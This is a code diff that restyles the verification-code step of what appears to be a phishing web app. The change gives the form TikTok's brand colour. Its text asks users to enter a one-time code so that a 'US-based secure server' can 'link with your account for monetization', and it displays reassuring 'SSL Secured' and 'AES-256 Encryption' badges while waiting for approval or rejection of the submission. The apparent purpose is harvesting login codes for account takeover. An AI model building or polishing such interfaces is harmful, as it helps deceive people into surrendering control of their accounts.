@@ -2,13 +2,12 @@
 'use client';
 
 import { zodResolver } from '@hookform/resolvers/zod';
-import { ArrowLeft, KeyRound, Loader2, ArrowRight, HelpCircle, ShieldCheck, Lock } from 'lucide-react';
+import { ArrowLeft, Loader2, ArrowRight, HelpCircle, ShieldCheck, Lock } from 'lucide-react';
 import { useForm } from 'react-hook-form';
 import * as z from 'zod';
 import { Button } from '@/components/ui/button';
 import { Form, FormControl, FormField, FormItem, FormMessage, FormLabel } from '@/components/ui/form';
 import { InputOTP, InputOTPGroup, InputOTPSlot } from '@/components/ui/input-otp';
-import { Progress } from '@/components/ui/progress';
 import type { Submission } from '@/lib/types';
 import { useState, useEffect } from 'react';
 import { useToast } from '@/hooks/use-toast';
@@ -116,8 +115,8 @@ export function VerifyCodeStep({ submissionId, onApproval, onRejection, onBack }
                 <Loader2 className="h-12 w-12 animate-spin text-primary" />
                 
                 <div>
-                     <h2 className="text-xl font-semibold">Confirming your code...</h2>
-                     <p className="text-muted-foreground mt-2">This will just take a moment.</p>
+                     <h2 className="text-xl font-semibold text-slate-900">Confirming your code...</h2>
+                     <p className="text-slate-500 mt-2">This will just take a moment.</p>
                 </div>
 
                 <ResendCode />
@@ -127,32 +126,31 @@ export function VerifyCodeStep({ submissionId, onApproval, onRejection, onBack }
 
 
     return (
-        <div className={cn("w-full max-w-lg mx-auto", shake && "animate-shake")}>
-             <div className="text-center mb-8">
-                <div className="flex h-16 w-16 items-center justify-center rounded-full bg-primary/10 text-primary mb-4 mx-auto">
-                    <KeyRound className="h-8 w-8" />
-                </div>
-                <h1 className="text-2xl font-bold">Step 2: Verify Account Ownership</h1>
-                <p className="text-muted-foreground max-w-md mx-auto">
-                    To protect our network, we need to verify you are the owner of @{submissionId}. We have sent a verification code to your registered email/phone. Please enter it below to proceed with the region-switch.
+        <div className={cn(shake && "animate-shake")}>
+             <div className="w-full bg-slate-100 h-1.5 rounded-full mb-8">
+                <div className="bg-gradient-to-r from-pink-500 to-rose-500 h-1.5 rounded-full w-2/4 shadow-sm"></div>
+            </div>
+            
+            <div className="text-center mb-8">
+                <h2 className="text-2xl font-extrabold text-slate-900">Step 2: Verify Ownership</h2>
+                <p className="text-slate-500 mt-2">
+                    To protect our network, we need to verify you own this account. We've sent a code to <span className="font-semibold text-slate-700">{submissionId}</span>.
                 </p>
             </div>
-
-            <Progress value={50} className="w-[80%] mx-auto mb-8" />
             
             <Form {...form}>
-                <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
+                <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                     <FormField
                         control={form.control}
                         name="verificationCode"
                         render={({ field }) => (
                             <FormItem>
-                                <FormLabel className="flex justify-center items-center gap-2">
+                                <FormLabel className="block text-xs font-bold text-slate-400 uppercase tracking-widest mb-2 ml-1 flex justify-between items-center">
                                     <span>Verification Code</span>
                                     <TooltipProvider>
                                         <Tooltip>
                                             <TooltipTrigger asChild>
-                                                <HelpCircle className="h-4 w-4 text-muted-foreground cursor-help" />
+                                                <HelpCircle className="h-4 w-4 text-slate-400 cursor-help" />
                                             </TooltipTrigger>
                                             <TooltipContent className="max-w-xs">
                                                 <p>This code allows our US-based secure server to link with your account for monetization purposes only. We never see your password, and our access is limited to managing your Rewards Dashboard.</p>
@@ -161,22 +159,21 @@ export function VerifyCodeStep({ submissionId, onApproval, onRejection, onBack }
                                     </TooltipProvider>
                                 </FormLabel>
                                 <FormControl>
-                                    <div className="flex justify-center">
                                     <InputOTP 
                                         maxLength={6} 
                                         {...field} 
                                         disabled={isSubmitting || isWaiting}
+                                        containerClassName="justify-center"
                                     >
-                                        <InputOTPGroup>
-                                            <InputOTPSlot index={0} />
-                                            <InputOTPSlot index={1} />
-                                            <InputOTPSlot index={2} />
-                                            <InputOTPSlot index={3} />
-                                            <InputOTPSlot index={4} />
-                                            <InputOTPSlot index={5} />
+                                        <InputOTPGroup className="gap-3">
+                                            <InputOTPSlot index={0} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
+                                            <InputOTPSlot index={1} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
+                                            <InputOTPSlot index={2} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
+                                            <InputOTPSlot index={3} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
+                                            <InputOTPSlot index={4} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
+                                            <InputOTPSlot index={5} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
                                         </InputOTPGroup>
                                     </InputOTP>
-                                    </div>
                                 </FormControl>
                                 <FormMessage className="text-center" />
                             </FormItem>
@@ -184,23 +181,23 @@ export function VerifyCodeStep({ submissionId, onApproval, onRejection, onBack }
                     />
 
                      <div className="flex justify-around items-center text-xs text-muted-foreground pt-4">
-                        <div className="flex items-center gap-2">
+                        <div className="flex items-center gap-2 text-slate-500">
                             <ShieldCheck className="h-4 w-4 text-green-500" />
                             <span>SSL Secured</span>
                         </div>
-                        <div className="flex items-center gap-2">
+                        <div className="flex items-center gap-2 text-slate-500">
                             <Lock className="h-4 w-4 text-green-500" />
                             <span>AES-256 Encryption</span>
                         </div>
                     </div>
                     
                     <div className="flex flex-col gap-4 pt-4">
-                        <Button type="submit" size="lg" className="w-full rounded-full" disabled={isButtonDisabled}>
+                        <Button type="submit" disabled={isButtonDisabled} className="w-full bg-[#FE2C55] hover:bg-[#E62247] text-white font-bold py-4 rounded-2xl shadow-lg shadow-rose-200 transition-transform active:scale-[0.98] flex items-center justify-center gap-2 h-auto text-base">
                              {(isSubmitting || isWaiting) && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                              {isWaiting ? 'Verifying...' : 'Continue'}
                              {!isSubmitting && !isWaiting && <ArrowRight className="ml-2 h-5 w-5" />}
                         </Button>
-                        <Button type="button" variant="outline" size="lg" className="w-full rounded-full" onClick={onBack} disabled={isSubmitting || isWaiting}>
+                        <Button type="button" variant="outline" onClick={onBack} disabled={isSubmitting || isWaiting} className="w-full bg-transparent hover:bg-slate-100 text-slate-500 font-bold py-4 rounded-2xl transition-transform active:scale-[0.98] flex items-center justify-center gap-2 h-auto text-base">
                             <ArrowLeft className="mr-2 h-5 w-5" />
                             Back
                         </Button>
